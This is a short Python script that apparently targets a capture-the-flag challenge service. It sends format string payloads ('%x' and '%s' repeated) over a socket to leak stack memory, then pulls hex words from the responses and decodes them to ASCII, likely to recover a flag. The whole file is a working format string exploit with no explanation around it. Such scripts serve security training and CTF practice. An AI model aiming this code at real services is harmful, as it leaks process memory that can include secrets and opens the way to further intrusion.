import socket
import re

# Function to decode hexadecimal to ASCII
def hex_to_ascii(hex_values):
    ascii_output = ""
    for hex_val in hex_values:
        try:
            # Convert hex to ASCII, ignoring invalid values
            ascii_output += bytes.fromhex(hex_val).decode("utf-8", errors="ignore")
        except ValueError:
            pass
    return ascii_output

# Target details
host = "challenges.0x0539.net"
port = 7070

# List of payloads to send
payloads = [
    "%x " * 10,  # Leak first 10 stack values
    "%x " * 20,  # Leak first 20 stack values
    "%x " * 30,  # Leak first 30 stack values
    "%s " * 5,   # Try interpreting addresses as strings
]

# Automate testing with multiple payloads
with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.connect((host, port))
    banner = s.recv(1024).decode()  # Receive initial banner
    print("Banner:\n", banner)

    for i, payload in enumerate(payloads):
        print(f"\n[+] Sending Payload {i + 1}: {payload.strip()}")
        s.sendall(payload.encode() + b"\n")
        
        # Receive response and decode
        response = s.recv(4096).decode()  # Adjust buffer size if needed
        print("\nRaw Response:\n", response)

        # Extract hexadecimal values from the response
        hex_values = re.findall(r"[0-9a-fA-F]{8}", response)
        print("\nHex Values:\n", hex_values)

        # Decode the hex values into ASCII
        decoded_output = hex_to_ascii(hex_values)
        print("\nDecoded ASCII:\n", decoded_output)
